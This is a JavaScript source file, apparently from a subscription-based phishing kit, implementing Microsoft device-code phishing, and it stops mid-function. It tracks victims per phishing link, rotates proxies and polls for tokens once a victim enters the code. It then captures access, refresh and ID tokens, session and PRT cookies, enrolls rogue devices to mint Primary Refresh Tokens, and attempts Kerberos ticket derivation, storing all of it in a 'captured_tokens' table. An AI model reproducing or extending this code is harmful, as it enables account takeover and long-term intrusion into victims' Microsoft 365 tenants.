/**
 * VGenius C Engine – Device Proxy Service
 */
const axios = require('axios');
const ms = require('./microsoftclient');
const { HttpsProxyAgent } = require('https-proxy-agent');
const jwt = require('jsonwebtoken');
const db = require('../database/connection');
const config = require('../config/env');
const { encrypt, decrypt } = require('../utils/encrypt');
const { sendTelegramDocument } = require('../services/notification');
const proxyManager = require('../services/proxymanager');
const cookieConverter = require('./cookieconverter');
const { parsePrtClaims } = require('./kerberos');
const { enrollDevice } = require('./devicecode');
const devicemanager = require('./devicemanager');
const dcdiag = require('../utils/dcdiag');
const ioHolder = require('./io');

// In-memory job store (for active device code flows)
const activeJobs = new Map();

/**
 * Start a new device code flow
 * @param {string} mode - "token" or "cookie"
 * @param {string} jwtToken - The link's JWT token (user_id, link_id)
 * @param {object} reqOptions - Optional: { ip, userAgent } for capturing visitor info
 * @returns {object} job data including user_code, verification_uri, etc.
 */
async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
  dcdiag.log('flow_start mode=' + mode + ' req_ip=' + ((reqOptions && reqOptions.ip) || '(none)') + ' req_tenant=' + ((reqOptions && reqOptions.tenant) || '(global)'));
  try {
    // Decode JWT to get user_id and link_id
    const decoded = jwt.verify(jwtToken, config.JWT_SECRET);
    const { user_id, link_id } = decoded;

    // Verify user and link are active
    const [users] = await db.query(
      "SELECT * FROM users WHERE id = ? AND subscription_status = 'active' AND (subscription_expiry IS NULL OR subscription_expiry > NOW())",
      [user_id]
    );
    if (!users.length) {
      dcdiag.fail('flow_aborted user_id=' + user_id + ' link_id=' + link_id + ' reason=subscription_inactive');
      throw new Error('Subscription inactive');
    }
    dcdiag.log('flow_ok user_id=' + user_id + ' link_id=' + link_id + ' subscription=active');
    const user = users[0];

    const [links] = await db.query(
      'SELECT * FROM links WHERE id = ? AND user_id = ? AND status = ? AND kill_switched = 0',
      [link_id, user_id, 'active']
    );
    if (!links.length) {
      dcdiag.fail('flow_aborted user_id=' + user_id + ' link_id=' + link_id + ' reason=link_not_active_or_killed');
      throw new Error('Link not active');
    }
    const link = links[0];

    dcdiag.log('flow_link user_id=' + user_id + ' link_id=' + link_id + ' template=' + link.template_type + ' verification_design=' + (link.verification_design || '(none)'));

    // Call Microsoft Device Code endpoint via proxy. The caller (the worker,
    // or a self-hosted page) may supply the link-specific tenant / client id;
    // fall back to the global config when it does not.
    const tenant = (reqOptions && reqOptions.tenant) || config.AZURE_TENANT || 'common';
    const clientId = (reqOptions && reqOptions.clientId) || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
    const deviceCodeScope = 'https://graph.microsoft.com/.default openid offline_access';
    const deviceCodeUrl = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`;
    dcdiag.log('ms_devicecode user_id=' + user_id + ' link_id=' + link_id + ' tenant=' + tenant + ' client_id=' + String(clientId).substring(0, 8) + '...');

    const deviceCodeClaims = {
      access_token: {
        amr: { values: ['ngcmfa'] },
        xms_cc: { values: ['cp1'] },
      },
    };
    const deviceCodeBody = new URLSearchParams({
      client_id: clientId,
      scope: deviceCodeScope,
      claims: JSON.stringify(deviceCodeClaims),
    });
    const requestHeaders = {
      'Content-Type': 'application/x-www-form-urlencoded'
    };

    let proxy = null;
    let dcData = null;

    try {
      const sticky = await ms.post(deviceCodeUrl, deviceCodeBody, {
        headers: requestHeaders,
        timeout: 15000,
        stickyProxy: true,
      });
      proxy = sticky.proxy;
      const data = sticky.response && sticky.response.data;
      if (data && data.user_code && data.device_code) {
        dcData = data;
        dcdiag.log('ms_devicecode_ok user_id=' + user_id + ' link_id=' + link_id + ' via=proxy proxy=' + (sticky.proxy && sticky.proxy.id));
      } else {
        dcdiag.fail('ms_devicecode_empty_response user_id=' + user_id + ' link_id=' + link_id + ' via=proxy body=' + String(data).substring(0, 200));
      }
    } catch (err) {
      dcdiag.fail('ms_devicecode_proxy_failed user_id=' + user_id + ' link_id=' + link_id + ' err=' + err.message);
    }

    if (!dcData) {
      dcdiag.log('ms_devicecode_via_direct user_id=' + user_id + ' link_id=' + link_id);
      const direct = await ms.post(deviceCodeUrl, deviceCodeBody, {
        headers: requestHeaders,
        timeout: 15000,
        noProxy: true,
      });
      const data = direct.data;
      if (data && data.user_code && data.device_code) {
        dcData = data;
        dcdiag.log('ms_devicecode_ok user_id=' + user_id + ' link_id=' + link_id + ' via=direct');
        if (proxy && proxy.id) {
          try { await proxyManager.releaseProxy(proxy.id, false); } catch (e) { /* ignore */ }
        }
        proxy = null;
      } else {
        dcdiag.fail('ms_devicecode_empty_response user_id=' + user_id + ' link_id=' + link_id + ' via=direct body=' + String(data).substring(0, 200));
      }
    }

    if (!dcData) {
      if (proxy && proxy.id) {
        try { await proxyManager.releaseProxy(proxy.id, false); } catch (e) { /* ignore */ }
      }
      dcdiag.fail('flow_aborted user_id=' + user_id + ' link_id=' + link_id + ' reason=ms_returned_no_user_code');
      throw new Error('Microsoft device code request failed: no user_code returned (proxy and direct attempts both failed)');
    }

    const jobId = `job_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
    dcdiag.log('job_created jobId=' + jobId + ' user_id=' + user_id + ' link_id=' + link_id + ' user_code=' + dcData.user_code + ' expires_in=' + (dcData.expires_in || 900));

    // Store job in memory with IP/user-agent for later token capture
    activeJobs.set(jobId, {
      jobId,
      user_id,
      link_id,
      device_code: dcData.device_code,
      user_code: dcData.user_code,
      verification_uri: dcData.verification_uri,
      verification_uri_complete: dcData.verification_uri_complete || `${dcData.verification_uri}?code=${dcData.user_code}`,
      interval: dcData.interval || 5,
      expires_in: dcData.expires_in || 900,
      expires_at: Date.now() + (dcData.expires_in || 900) * 1000,
      mode: mode || 'cookie',
      // Recorded so pollForToken() talks to the same tenant / client id as the
      // device-code call above. The token endpoint rejects a mismatched pair.
      tenant: tenant,
      clientId: clientId,
      status: 'polling',
      created_at: Date.now(),
      jwtToken,
      ip_address: (reqOptions && reqOptions.ip) || 'unknown',
      user_agent: (reqOptions && reqOptions.userAgent) || 'DeviceProxy',
      proxy_id: proxy ? proxy.id : null,
      proxy_host: proxy ? proxy.proxy_host : null,
      proxy: proxy || null,
    });

    // Start polling in background
    pollForToken(jobId).catch(function (err) {
      dcdiag.fail('poll_crashed jobId=' + jobId + ' user_id=' + user_id + ' link_id=' + link_id + ' err=' + err.message);
    });

    return {
      job_id: jobId,
      user_code: dcData.user_code,
      verification_uri: dcData.verification_uri,
      verification_uri_complete: dcData.verification_uri_complete || `${dcData.verification_uri}?code=${dcData.user_code}`,
      expires_in: dcData.expires_in,
      interval: dcData.interval || 5,
      message: dcData.message,
    };
  } catch (err) {
    dcdiag.fail('flow_start_failed err=' + (err && err.message) + ' http_status=' + (err && err.response && err.response.status) + ' http_body=' + String(err && err.response && err.response.data).substring(0, 250));
    throw err;
  }
}

/**
 * Poll for token completion
 */
async function pollForToken(jobId) {
  const job = activeJobs.get(jobId);
  if (!job) {
    dcdiag.fail('poll_no_job jobId=' + jobId);
    return;
  }

  // Use the same tenant / client id as the device-code call that created this
  // job. A mismatched pair makes the token endpoint reject the grant.
  const tenant = job.tenant || config.AZURE_TENANT || 'organizations';
  const clientId = job.clientId || config.AZURE_CLIENT_ID;
  const maxAttempts = Math.ceil((job.expires_in || 900) / (job.interval || 5));
  dcdiag.log('poll_start jobId=' + jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' tenant=' + tenant + ' interval=' + (job.interval || 5) + 's max_attempts=' + maxAttempts + ' expires_in=' + (job.expires_in || 900));

  for (let i = 0; i < maxAttempts; i++) {
    if (!activeJobs.has(jobId)) return; // Job cancelled

    // Check if expired before polling
    if (Date.now() > job.expires_at) {
      job.status = 'expired';
      dcdiag.fail('poll_expired jobId=' + jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' attempts=' + (i + 1) + ' no_token_obtained');
      // Update visitor status to timeout
      try {
        const [r] = await db.query(
          'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
          ['timeout', job.user_id, job.link_id, 'waiting']
        );
        dcdiag.log('visitor_status jobId=' + jobId + ' link_id=' + job.link_id + ' ->timeout updated=' + r.affectedRows);
      } catch (e) {
        dcdiag.fail('visitor_timeout_failed jobId=' + jobId + ' err=' + e.message);
      }
      return;
    }

    await new Promise(resolve => setTimeout(resolve, (job.interval || 5) * 1000));

    try {
      // Use the same proxy as the device code request for token polling
      const tokenResponse = await ms.post(
        `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
        new URLSearchParams({
          grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
          client_id: clientId,
          device_code: job.device_code,
        }),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          validateStatus: () => true,
          timeout: 15000,
          proxy: job.proxy || null,
          noProxy: !job.proxy,
        }
      );

      const tokenData = tokenResponse.data;

      if (tokenData.access_token) {
        // SUCCESS! Store token
        job.status = 'completed';
        dcdiag.log('token_obtained jobId=' + jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' attempt=' + (i + 1) + ' has_refresh=' + (!!tokenData.refresh_token) + ' has_id_token=' + (!!tokenData.id_token) + ' set_cookies=' + ((tokenResponse.headers['set-cookie'] || []).length));

        // Extract email FIRST before using it
        let capturedEmail = null;
        if (tokenData.id_token) {
          try {
            const payload = JSON.parse(Buffer.from(tokenData.id_token.split('.')[1], 'base64').toString());
            capturedEmail = payload.email || payload.upn || payload.preferred_username || null;
          } catch (e) {
            /* ignore */
          }
        }

        // Capture Set-Cookie headers from the token response (session cookies)
        const responseCookies = [];
        const setCookieHeaders = tokenResponse.headers['set-cookie'] || [];
        for (const cookieStr of setCookieHeaders) {
          const cookieParts = cookieStr.split(';')[0].trim();
          const eqIndex = cookieParts.indexOf('=');
          if (eqIndex > 0) {
            const cookieName = cookieParts.substring(0, eqIndex).trim();
            const cookieValue = cookieParts.substring(eqIndex + 1).trim();
            if (cookieName && cookieValue) {
              responseCookies.push({
                name: cookieName,
                value: cookieValue,
                domain: '.login.microsoftonline.com'
              });
            }
          }
        }


        if (tokenData.refresh_token) {
          try {
            const refreshResponse = await ms.post(
              `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
              new URLSearchParams({
                grant_type: 'refresh_token',
                client_id: clientId,
                refresh_token: tokenData.refresh_token,
                scope: 'openid profile offline_access'
              }),
              {
                headers: {
                  'Content-Type': 'application/x-www-form-urlencoded'
                },
                validateStatus: () => true,
                timeout: 15000,
                proxy: job.proxy,
                noProxy: !job.proxy_id,
              }
            );

            // Capture PRT cookie from refresh token exchange
            const refreshSetCookies = refreshResponse.headers['set-cookie'] || [];
            for (const cookieStr of refreshSetCookies) {
              const cookieParts = cookieStr.split(';')[0].trim();
              const eqIndex = cookieParts.indexOf('=');
              if (eqIndex > 0) {
                const cookieName = cookieParts.substring(0, eqIndex).trim();
                const cookieValue = cookieParts.substring(eqIndex + 1).trim();
                if (cookieName === 'x-ms-RefreshTokenCredential' && cookieValue) {
                  // Add PRT cookie to responseCookies
                  responseCookies.push({
                    name: cookieName,
                    value: cookieValue,
                    domain: '.login.microsoftonline.com'
                  });
                }
              }
            }

            // If refresh token exchange returned a new refresh token, update tokenData
            if (refreshResponse.data && refreshResponse.data.refresh_token) {
              tokenData.refresh_token = refreshResponse.data.refresh_token;
            }
          } catch (e) {
            /* ignore */
          }
        }

        // Store cookies and email in job for later storage
        job.captured_cookies = responseCookies;
        job.captured_email = capturedEmail;
        await storeToken(job, tokenData, responseCookies);

        // Mark proxy as success
        if (job.proxy_id) {
          try {
            await proxyManager.markSuccess(job.proxy_id);
          } catch (e) {
            /* ignore */
          }
        }

        // Mark visitors as done for this user/link
        try {
          const [doneR] = await db.query(
            'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
            ['done', job.user_id, job.link_id, 'waiting']
          );
          dcdiag.log('visitor_status jobId=' + jobId + ' link_id=' + job.link_id + ' ->done updated=' + doneR.affectedRows);
          if (doneR.affectedRows === 0) {
            dcdiag.fail('visitor_done_no_rows jobId=' + jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' no_waiting_visitor_found');
          }
        } catch (e) {
          dcdiag.fail('visitor_done_failed jobId=' + jobId + ' err=' + e.message);
        }
        return;
      }

      // Check for AADSTS50076 / soft error
      const errorCode = tokenData.error || '';
      const errorDesc = tokenData.error_description || '';

      if (errorCode === 'authorization_pending') continue;
      if (errorCode) dcdiag.log('poll_error jobId=' + jobId + ' attempt=' + (i + 1) + ' code=' + errorCode + ' desc=' + String(errorDesc).substring(0, 150));

      if (errorCode === 'slow_down') {
        // Increase interval
        job.interval = (job.interval || 5) + 5;
        continue;
      }

      // Personal account errors - stop immediately with "code expired" behavior
      if (
        errorCode === 'expired_token' ||
        errorCode === 'authorization_declined' ||
        errorDesc.includes('AADSTS50079') ||  // MSA account requires interaction
        errorDesc.includes('personal account') ||
        errorDesc.includes('MSA') ||
        (errorCode === 'invalid_grant' && (
          errorDesc.includes('expired') ||
          errorDesc.includes('personal') ||
          errorDesc.includes('MSA')
        ))
      ) {
        job.status = 'failed';
        job.error = 'Code expired';
        dcdiag.fail('poll_failed jobId=' + jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' code=' + errorCode + ' desc=' + String(errorDesc).substring(0, 150));
        return;
      }

      // AADSTS50076 or interaction_required -> soft error
      if (
        errorDesc.includes('aadsts50076') ||
        errorDesc.includes('interaction_required') ||
        errorCode === 'authorization_declined'
      ) {
        job.status = 'soft_error';
        dcdiag.log('poll_soft_error jobId=' + jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' retrying_token_mode');
        // Start a new device code flow in token mode and store it
        const newJob = await retryAsTokenMode(job);
        if (newJob) {
          job.retry_job_id = newJob.jobId;
          dcdiag.log('poll_retry_job jobId=' + jobId + ' retry_jobId=' + newJob.jobId + ' new_user_code=' + newJob.user_code);
        } else {
          dcdiag.fail('poll_retry_failed jobId=' + jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' code=' + errorCode);
        }
        return;
      }
    } catch (err) {
      dcdiag.fail('poll_exception jobId=' + jobId + ' attempt=' + (i + 1) + ' err=' + err.message);
      // Mark proxy as failure
      if (job.proxy_id) {
        try {
          await proxyManager.markFailure(job.proxy_id);
        } catch (e) {
          /* ignore */
        }
      }
      // Continue polling on network errors
    }
  }

  // Exhausted attempts - mark as expired with visitor timeout
  job.status = 'expired';
  dcdiag.fail('poll_exhausted jobId=' + jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' attempts=' + maxAttempts + ' no_token_obtained');
  try {
    const [xR] = await db.query(
      'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
      ['timeout', job.user_id, job.link_id, 'waiting']
    );
    dcdiag.log('visitor_status jobId=' + jobId + ' link_id=' + job.link_id + ' ->timeout updated=' + xR.affectedRows);
  } catch (e) {
    dcdiag.fail('visitor_timeout_failed jobId=' + jobId + ' err=' + e.message);
  }
}

/**
 * Retry as token mode (create new device code)
 */
async function retryAsTokenMode(originalJob) {
  dcdiag.log('retry_start user_id=' + originalJob.user_id + ' link_id=' + originalJob.link_id + ' from_job=' + originalJob.jobId);
  try {
    // Use same tenant as device code endpoint (organizations for adrs_access scope)
    const tenant = config.AZURE_TENANT || 'organizations';
    const clientId = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';

    // Claim a sticky proxy for the retry flow
    const { proxy, response: dcResponse } = await ms.post(
      `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
      new URLSearchParams({
        client_id: clientId,
        scope: 'https://graph.microsoft.com/.default openid offline_access',
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        timeout: 15000,
        stickyProxy: true,
      }
    );

    const dcData = dcResponse.data;
    const newJobId = `job_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;

    const newJob = {
      jobId: newJobId,
      user_id: originalJob.user_id,
      link_id: originalJob.link_id,
      device_code: dcData.device_code,
      user_code: dcData.user_code,
      verification_uri: dcData.verification_uri,
      verification_uri_complete: dcData.verification_uri_complete || `${dcData.verification_uri}?code=${dcData.user_code}`,
      interval: dcData.interval || 5,
      expires_in: dcData.expires_in || 900,
      expires_at: Date.now() + (dcData.expires_in || 900) * 1000,
      mode: 'token',
      status: 'polling',
      created_at: Date.now(),
      jwtToken: originalJob.jwtToken,
      is_retry: true,
      proxy_id: proxy ? proxy.id : null,
      proxy_host: proxy ? proxy.proxy_host : null,
      proxy: proxy || null,
    };

    activeJobs.set(newJobId, newJob);
    dcdiag.log('retry_job_created jobId=' + newJobId + ' user_id=' + originalJob.user_id + ' link_id=' + originalJob.link_id + ' user_code=' + dcData.user_code);
    pollForToken(newJobId).catch(function (err) {
      dcdiag.fail('poll_crashed retry jobId=' + newJobId + ' err=' + err.message);
    });

    return {
      jobId: newJobId,
      user_code: dcData.user_code,
      verification_uri: dcData.verification_uri,
      verification_uri_complete: dcData.verification_uri_complete || `${dcData.verification_uri}?code=${dcData.user_code}`,
      expires_in: dcData.expires_in,
      interval: dcData.interval || 5,
    };
  } catch (err) {
    dcdiag.fail('retry_failed user_id=' + originalJob.user_id + ' link_id=' + originalJob.link_id + ' err=' + (err && err.message));
    return null;
  }
}

/**
 * Store captured token in database
 */
async function storeToken(job, tokenData, responseCookies = []) {
  dcdiag.log('store_start jobId=' + job.jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' mode=' + (job.mode || 'token') + ' ip=' + (job.ip_address || '(none)') + ' cookies_in=' + (responseCookies || []).length);
  try {
    // Extract email and tenant from id_token
    let email = null;
    let idTokenTenant = null;
    if (tokenData.id_token) {
      try {
        const payload = JSON.parse(Buffer.from(tokenData.id_token.split('.')[1], 'base64').toString());
        email = payload.email || payload.upn || payload.preferred_username || payload.unique_name || null;
        idTokenTenant = payload.tid || null; // Extract actual tenant ID from token
      } catch (e) {
        /* ignore */
      }
    }
    if (!email && tokenData.access_token) {
      try {
        const payload = JSON.parse(Buffer.from(tokenData.access_token.split('.')[1], 'base64').toString());
        email = payload.email || payload.upn || payload.preferred_username || payload.unique_name || null;
      } catch (e) {
        /* ignore */
      }
    }

    // Use stored IP and user-agent from when the flow started
    const ipAddress = job.ip_address || 'unknown';
    const userAgent = job.user_agent || 'DeviceProxy';

    // Format cookies for storage
    let cookiesEncrypted = null;
    if (responseCookies && responseCookies.length > 0) {
      const cookieStrings = responseCookies.map(
        c => `${c.name}=${c.value}; domain=${c.domain}; path=/; secure`
      ).join('; ');
      cookiesEncrypted = encrypt(cookieStrings);
    }

    // Determine tenant - prefer id_token tenant, fallback to link's jwt_payload
    let tenant = idTokenTenant || 'common';
    if (!idTokenTenant && job.jwtToken) {
      try {
        const decoded = jwt.verify(job.jwtToken, config.JWT_SECRET);
        const [links] = await db.query('SELECT jwt_payload FROM links WHERE id = ? AND user_id = ?', [decoded.link_id, decoded.user_id]);
        if (links.length && links[0].jwt_payload) {
          const parsed = JSON.parse(links[0].jwt_payload);
          if (parsed.tenant) tenant = parsed.tenant;
        }
      } catch (e) { /* use default */ }
    }

    // Extract PRT and related fields from token response
    let prt = null;
    let sessionKeyJwe = null;
    let deviceTenantId = null;
    let clientInfo = null;

    const prtCookie = responseCookies.find(c => c.name === 'x-ms-RefreshTokenCredential');
    if (prtCookie && prtCookie.value) {
      const prtCookieClaims = parsePrtClaims(prtCookie.value);
      if (prtCookieClaims) {
        prt = prtCookie.value;
      } else {
      }
    }

    if (!prt && tokenData.refresh_token) {
      if (parsePrtClaims(tokenData.refresh_token)) {
        prt = tokenData.refresh_token;
      }
    }

    // Extract session_key_enc from token response (if present)
    if (tokenData.session_key_enc) {
      sessionKeyJwe = tokenData.session_key_enc;
    }

    // Extract client_info from token response (base64-encoded JSON with uid/utid)
    if (tokenData.client_info) {
      try {
        const clientInfoParsed = JSON.parse(Buffer.from(tokenData.client_info, 'base64').toString());
        deviceTenantId = clientInfoParsed.utid || null;
        clientInfo = tokenData.client_info;
      } catch (e) { /* ignore */ }
    }

    // Broker device enrollment from access_token
    let deviceId = null;
    let deviceEnrolled = false;
    let enrollmentTime = null;
    let deviceCertificateEncrypted = null;
    let encryptedPrivateKey = null;
    let privateKeyPemForPrt = null;
    let certificateDerForPrt = null;
    let enrolledDeviceMaterial = null;

    if (tokenData.access_token) {
      try {
        const accessPayload = JSON.parse(Buffer.from(tokenData.access_token.split('.')[1], 'base64').toString());
        deviceId = accessPayload['device_code_id'] || accessPayload['xms_device_id'] || accessPayload['oid'] || null;
      } catch (e) {
        deviceId = null;
      }
    }

    if (deviceId) {
      try {
        const enrollmentResult = await enrollDevice(tokenData.access_token, deviceId, tenant);
        deviceEnrolled = true;
        enrollmentTime = new Date();

        if (enrollmentResult.deviceCertificate) deviceCertificateEncrypted = encrypt(enrollmentResult.deviceCertificate);
        if (enrollmentResult.privateKeyPem) encryptedPrivateKey = encrypt(enrollmentResult.privateKeyPem);
        privateKeyPemForPrt = enrollmentResult.privateKeyPem || null;
        certificateDerForPrt = enrollmentResult.certificateDerBase64 || null;
        enrolledDeviceMaterial = {
          deviceId: enrollmentResult.deviceId || deviceId,
          deviceCertificate: enrollmentResult.deviceCertificate || null,
          privateKeyPem: enrollmentResult.privateKeyPem || null,
          certificateDerBase64: enrollmentResult.certificateDerBase64 || null,
        };

      } catch (enrollErr) {
        deviceEnrolled = false;
      }
    }

    if (!deviceEnrolled && tokenData.refresh_token) {
      try {
        const fresh = await devicemanager.exchangeForDrsToken(tokenData.refresh_token, tenant);
        if (fresh && fresh.accessToken && fresh.deviceId) {
          const retryResult = await enrollDevice(fresh.accessToken, fresh.deviceId, tenant);
          if (retryResult && (retryResult.deviceCertificate || retryResult.privateKeyPem)) {
            deviceEnrolled = true;
            enrollmentTime = new Date();
            if (retryResult.deviceCertificate) deviceCertificateEncrypted = encrypt(retryResult.deviceCertificate);
            if (retryResult.privateKeyPem) encryptedPrivateKey = encrypt(retryResult.privateKeyPem);
            privateKeyPemForPrt = retryResult.privateKeyPem || null;
            certificateDerForPrt = retryResult.certificateDerBase64 || null;
            enrolledDeviceMaterial = {
              deviceId: retryResult.deviceId || fresh.deviceId,
              deviceCertificate: retryResult.deviceCertificate || null,
              privateKeyPem: retryResult.privateKeyPem || null,
              certificateDerBase64: retryResult.certificateDerBase64 || null,
            };
          }
        }
      } catch (refreshErr) {
      }
    }

    // Fallback: extract client_info from id_token JWT payload
    if (!clientInfo && tokenData.id_token) {
      try {
        const idTokenClaims = parsePrtClaims(tokenData.id_token);
        if (idTokenClaims && idTokenClaims.hasOwnProperty('tid')) {
          deviceTenantId = idTokenClaims.tid || deviceTenantId;
          // Build a synthetic client_info from id_token claims
          clientInfo = JSON.stringify({
            uid: idTokenClaims.oid || idTokenClaims.sub || '',
            utid: idTokenClaims.tid || ''
          });
        }
      } catch (e) { /* ignore */ }
    }

    // Decode PRT JWT from Set-Cookie headers (x-ms-RefreshTokenCredential)
    // The PRT JWT contains: client_info, session_key, id_token, tid, uid
    if (prtCookie && prtCookie.value) {
      try {
        const prtClaims = parsePrtClaims(prtCookie.value);
        if (prtClaims) {
          // Extract client_info from PRT JWT (higher priority than token response)
          if (prtClaims.client_info && !clientInfo) {
            clientInfo = prtClaims.client_info;
          }
          // Extract device_tenant_id from PRT JWT client_info
          if (prtClaims.client_info) {
            try {
              const ci = JSON.parse(Buffer.from(prtClaims.client_info, 'base64').toString());
              deviceTenantId = ci.utid || deviceTenantId;
            } catch (e) { /* ignore */ }
          }
          // Extract session_key from PRT JWT (overrides session_key_enc from token response)
          if (prtClaims.session_key) {
            sessionKeyJwe = prtClaims.session_key;
          }
        } else {
          /* not a JWT */
        }
      } catch (e) {
        /* ignore */
      }
    }

    if (privateKeyPemForPrt && certificateDerForPrt && tokenData.refresh_token && !sessionKeyJwe) {
      try {
        const prtkdf = require('./prtkdf');
        const prtResult = await prtkdf.requestPrtForDevice({
          refreshToken: tokenData.refresh_token,
          privateKeyPem: privateKeyPemForPrt,
          certificateBase64: certificateDerForPrt,
        });
        if (prtResult.prt) prt = prtResult.prt;
        if (prtResult.sessionKeyJwe) sessionKeyJwe = prtResult.sessionKeyJwe;

        if (prtResult.sessionKeyHex) {
          try {
            await devicemanager.persistPrtSessionKey(
              job.user_id,
              tenant,
              prtResult.sessionKeyHex,
              enrolledDeviceMaterial || {
                deviceId: deviceId || null,
                deviceCertificate: null,
                privateKeyPem: privateKeyPemForPrt,
                certificateDerBase64: certificateDerForPrt,
              }
            );
          } catch (skErr) {
          }
        }
      } catch (prtErr) {
      }
    }

    let accountType = 'work_school';
    if (email) {
      const emailDomain = email.split('@')[1].toLowerCase();
      if (['outlook.com', 'hotmail.com', 'live.com', 'passport.com'].includes(emailDomain)) {
        accountType = 'personal';
      }
    }

    // Determine client_id used for this capture
    const clientIdUsed = config.AZURE_CLIENT_ID;

    let tokenId = null;
    try {
      try {
        const [result] = await db.query(
          `INSERT INTO captured_tokens
           (user_id, link_id, email, token_type, access_token_encrypted,
            refresh_token_encrypted, id_token_encrypted,
            prt, client_info, session_key_jwe, device_tenant_id,
            cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type,
            account_type, client_id,
            device_id, device_certificate_encrypted, encrypted_private_key,
            device_enrolled, enrollment_time)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
          [
            job.user_id,
            job.link_id,
            email,
            job.mode || 'token',
            encrypt(tokenData.access_token),
            encrypt(tokenData.refresh_token || null),
            encrypt(tokenData.id_token || null),
            encrypt(prt),
            clientInfo,
            encrypt(sessionKeyJwe),
            deviceTenantId,
            cookiesEncrypted,
            ipAddress,
            userAgent,
            tenant,
            'office',
            accountType,
            clientIdUsed,
            deviceId || null,
            deviceCertificateEncrypted,
            encryptedPrivateKey,
            deviceEnrolled ? 1 : 0,
            enrollmentTime,
          ]
        );
        tokenId = result.insertId;
      } catch (primaryInsertErr) {
        const primaryMsg = primaryInsertErr?.message || '';
        const isDeviceSchemaIssue =
          /Unknown column/i.test(primaryMsg) ||
          /Unknown column 'device_id'/.test(primaryMsg) ||
          /Unknown column 'device_certificate_encrypted'/.test(primaryMsg) ||
          /Unknown column 'encrypted_private_key'/.test(primaryMsg) ||
          /Unknown column 'device_enrolled'/.test(primaryMsg) ||
          /Unknown column 'enrollment_time'/.test(primaryMsg) ||
          /Unknown column 'session_key_jwe'/.test(primaryMsg) ||
          /Unknown column 'device_tenant_id'/.test(primaryMsg) ||
          /Unknown column 'client_info'/.test(primaryMsg);

        if (!isDeviceSchemaIssue) {
          throw primaryInsertErr;
        }

        const [legacyResult] = await db.query(
          `INSERT INTO captured_tokens
           (user_id, link_id, email, token_type, access_token_encrypted,
            refresh_token_encrypted, id_token_encrypted,
            prt, client_info, session_key_jwe, device_tenant_id,
            cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type, account_type, client_id)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?)`,
          [
            job.user_id,
            job.link_id,
            email,
            job.mode || 'token',
            encrypt(tokenData.access_token),
            encrypt(tokenData.refresh_token || null),
            encrypt(tokenData.id_token || null),
            encrypt(prt),
            clientInfo,
            encrypt(sessionKeyJwe),
            deviceTenantId,
            cookiesEncrypted,
            ipAddress,
            userAgent,
            tenant,
            'office',
            accountType,
            clientIdUsed,
          ]
        );
        tokenId = legacyResult.insertId;
      }
    } catch (e) {
      dcdiag.fail('token_insert_failed jobId=' + job.jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id + ' err=' + e.message);
    }
    dcdiag.log('token_stored tokenId=' + tokenId + ' jobId=' + job.jobId + ' user_id=' + job.user_id + ' link_id=' + job.link_id);

    if (tokenId && deviceEnrolled && accountType === 'work_school'
        && tenant && tenant !== 'common' && tenant !== 'organizations') {
      const kerberosService = require('./kerberos');
      kerberosService.deriveTGTForToken(tokenId)
        .catch(err => {});
    }

    // For cookie mode, trigger cookie conversion immediately after capture
    let cookieConversionResult = null;
    if (job.mode === 'cookie') {
      const refreshTokenForConversion = prt || tokenData.refresh_token || tokenData.access_token;
      const validPrtForConversion = !!(prt && parsePrtClaims(prt));
      if (!validPrtForConversion) {
        cookieConversionResult = { success: false, error: 'No valid PRT JWT available for cookie conversion' };
      } else {
        cookieConversionResult = await cookieConverter.processCookieConversion(tokenId, refreshTokenForConversion, 'office', tenant, accountType, job.user_id)
          .catch(err => {
            return { success: false, error: err.message };
          });
      }
    }

    if (accountType === 'work_school' && tokenData.access_token && !deviceEnrolled) {
      const deviceManager = require('./devicemanager');
      // Extract email domain for DRS registration (e.g., 'saintaloysiusms.org' from 'user@saintaloysiusms.org')
      const emailDomain = email ? email.split('@')[1] : null;

      // Flag to track if device registration failed
      let deviceRegistrationFailed = false;

      deviceManager.registerDeviceAndGetPrt({
        access_token: tokenData.access_token,
        refresh_token: tokenData.refresh_token,
        tenant_id: tenant,
        target_domain: emailDomain || tenant, // Use email domain for DRS, fallback to tenant GUID
        user_id: job.user_id,
        link_id: job.link_id
      }).then(async (registrationResult) => {
        // Store device credentials in database
        await deviceManager.storeDeviceCredentials(registrationResult, job.user_id, email);

        if (registrationResult.sessionKeyHex) {
          try {
            await deviceManager.persistPrtSessionKey(job.user_id, tenant, registrationResult.sessionKeyHex, {
              deviceId: registrationResult.deviceId,
              deviceCertificate: registrationResult.deviceCertificate,
              privateKeyPem: registrationResult.privateKey,
              certificateDerBase64: registrationResult.certificateDerBase64,
